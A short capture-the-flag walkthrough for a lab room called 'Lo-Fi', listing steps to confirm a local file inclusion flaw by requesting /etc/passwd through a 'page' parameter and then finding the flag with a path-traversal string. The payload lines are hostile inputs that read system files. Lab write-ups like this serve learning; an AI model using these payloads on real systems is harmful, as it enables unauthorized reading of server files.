**Room = Lo-Fi**



1. access the *http://IP*
2. test the `LFI` by `/?page=/etc/passwd` -> works, `LFI` confirmed
3. manually try the correct path:

&#x20;  • `/?page=/.flag.txt`
   • `/?page=/.flag.php`

&#x20;  • `/?page=/flag.txt`

&#x20;  • `/?page=/flag.php`

&#x20;  • `?page=../../../../flag.txt` -> ***{flag}***

